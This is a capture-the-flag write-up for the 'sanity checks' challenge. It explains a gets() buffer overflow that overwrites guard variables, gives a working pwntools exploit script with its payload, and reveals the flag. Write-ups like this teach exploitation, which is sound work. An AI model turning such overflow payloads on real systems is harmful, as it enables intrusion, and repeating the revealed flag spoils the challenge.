#### Challenge:

I made a [program](./checks ":ignore") ([source](./checks.c ":ignore")) to protect my flag. On the off chance someone does get in, I added some sanity checks to detect if something fishy is going on. See if you can hack me at `/problems/2021/sanity_checks` on the shell server, or connect with `nc shell.actf.co 21303`.

---

#### Solution:

We are given a binary and it's source code. In the code we can see function that prints the flag, but it won't run because there is set of conditions that check for specific values on variables that are all set to `0` and cannot be changed by "normal" means. Luckily for us, before the conditions, there is `gets` buffer overflow vulnerability, so we can set them right.

```python
#!/usr/bin/env python

from pwn import *
import struct

r = remote('shell.actf.co', 21303)

# r = process('./checks')


print(r.recvuntil("Enter the secret word: ").decode('utf-8').strip())

payload = b"password123\0" + b'A'*52 + b'B'*12 + struct.pack('<I',0x11) + struct.pack('<I',0x3d) + struct.pack('<I',0xf5) + struct.pack('<I',0x37) + struct.pack('<I',0x32)


print(payload)
r.sendline(payload)

print(r.recvline().decode('utf-8').strip())
print(r.recvline().decode('utf-8').strip())
```

---

<details><summary>FLAG:</summary>

```text
actf{if_you_aint_bout_flags_then_i_dont_mess_with_yall}
```

</details>
<br/>
